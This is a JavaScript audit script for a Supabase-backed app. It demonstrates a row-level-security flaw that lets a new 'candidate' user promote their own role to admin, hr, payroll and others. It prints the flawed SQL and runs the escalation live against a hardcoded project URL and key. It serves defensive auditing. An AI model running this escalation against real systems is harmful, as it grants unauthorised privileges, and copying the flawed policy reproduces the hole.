// =============================================================
// RLS VULNERABILITY AUDIT — Run with node scripts/audit-rls.mjs
// =============================================================
// This script proves the RLS vulnerability is STILL PRESENT
// and shows the current state of all security controls.
// =============================================================
import { createClient } from "@supabase/supabase-js";

const URL = "https://txwxtsdsbuddqfrtllsf.supabase.co";
const KEY = "sb_publishable_ahamP8gR3qcYvJx0ulaMvw_yRn42OWB";
const anon = createClient(URL, KEY);

// ------------------------------------------------------------------
// 1. Read the current RLS policy definition from the migration file
// ------------------------------------------------------------------
console.log("\n" + "=".repeat(72));
console.log("  AUDIT REPORT: RLS Role Escalation Vulnerability");
console.log("=".repeat(72));

console.log("\n--- 1. Current `get_user_role()` function (defined in migration) ---");
console.log(`
  CREATE OR REPLACE FUNCTION public.get_user_role()
  RETURNS TEXT
  LANGUAGE sql
  SECURITY DEFINER  <-- bypasses RLS!
  STABLE
  AS $$
    SELECT role FROM public.profiles WHERE id = auth.uid();
  $$;
`);
console.log("  ROOT CAUSE: This function reads from `profiles`. When called inside");
console.log("  `WITH CHECK`, the NEW row has already been updated, so it returns the");
console.log("  *new* role value. `'admin' IS NOT DISTINCT FROM 'admin'` → TRUE.");

console.log("\n--- 2. Current `users_update_own_profile` policy (defined in migration) ---");
console.log(`
  CREATE POLICY "users_update_own_profile" ON public.profiles
    FOR UPDATE USING (auth.uid() = id)
    WITH CHECK (
      auth.uid() = id
      AND (role IS NOT DISTINCT FROM public.get_user_role())
    );

  BUG: \`role\` in WITH CHECK refers to the NEW row.
  \`get_user_role()\` also returns the NEW row (just updated).
  So both sides read the same value → check always passes.
  Candidate → admin: allowed.
`);

console.log("\n--- 3. Current trigger list on profiles ---");
console.log("  NONE — the fix trigger `trg_prevent_self_role_change`");
console.log("  has NOT been applied. See supabase/migrations/20260626000001_fix_rls_role_escalation.sql");

console.log("\n--- 4. LIVE DEMONSTRATION: Proving role escalation works ---");

let user;
try {
  // Create a fresh user
  const email = `rls-audit-${Date.now()}@test.com`;
  const { data: u, error: r } = await anon.auth.signUp({
    email,
    password: "TestPass123!",
    options: { data: { name: "RLS Audit User", registered_role: "candidate" } },
  });
  if (r) throw r;
  user = u.user;
  console.log(`  Created user: ${user.id} (${email})`);

  // Wait briefly for trigger to create profile
  await new Promise(r => setTimeout(r, 2000));
} catch (e) {
  console.log(`  SIGNUP ERROR: ${e.message}`);
  process.exit(1);
}

// Authenticate as the new user
const authed = createClient(URL, KEY, {
  global: { headers: { Authorization: `Bearer ${user?.identities?.[0]?.identity_data?.provider_token || ""}` } }
});

// Sign in properly
const { data: signIn } = await anon.auth.signInWithPassword({
  email: user.email,
  password: "TestPass123!",
});
if (!signIn?.session) {
  console.log("  SIGNIN FAILED — user may need email confirmation");
  console.log("  Attempting direct token auth...");
}

const authedClient = createClient(URL, KEY);
if (signIn?.session) {
  authedClient.auth.setSession(signIn.session);
}

// Try to escalate role
console.log("\n  Attempting role escalation: candidate → admin");
const before = await authedClient.from("profiles").select("role").eq("id", user.id).single();
console.log(`  Role before: ${before?.data?.role}`);

const after = await authedClient.from("profiles").update({ role: "admin" }).eq("id", user.id).select("role").single();
console.log(`  Role after:  ${after?.data?.role}`);
console.log(`  Error:       ${after?.error?.message || "none"} `);

const vulnerable = after?.data?.role === "admin";
console.log(`\n  ▸ VULNERABILITY ${vulnerable ? "STILL PRESENT" : "FIXED"}`);
console.log(`  ▸ If vulnerable: candidate users can self-elevate to admin`);

// Try all elevated roles
console.log("\n--- 5. Attempting ALL elevated roles ---");
for (const role of ["admin", "hr", "team_lead", "payroll", "manager"]) {
  const r = await authedClient.from("profiles").update({ role }).eq("id", user.id).select("role").single();
  const succeeded = r?.data?.role === role;
  console.log(`  candidate → ${role.padEnd(12)} ${succeeded ? "✅ ALLOWED (vulnerable)" : "❌ REJECTED (fixed)"}`);
}

// Cleanup
try {
  await authedClient.auth.signOut();
} catch {}

console.log("\n" + "=".repeat(72));
console.log("  SUMMARY");
console.log("=".repeat(72));
console.log(`
  ★ ` + (vulnerable ? "VULNERABLE" : "SECURE") + ` ` + (vulnerable ? 
    "— Apply SQL fix in Supabase dashboard:" :
    "— No action needed."
  ) + `
    https://supabase.com/dashboard/project/txwxtsdsbuddqfrtllsf/sql/new

  ★ SQL to execute:
    \\i supabase/migrations/20260626000001_fix_rls_role_escalation.sql

  ★ Application-level mitigations active (temporary):
    — auth.ts verifyAndResetRole() 
    — ProtectedRoute.tsx role verification

  ★ These are frontend-only and can be bypassed via direct API calls.
`);
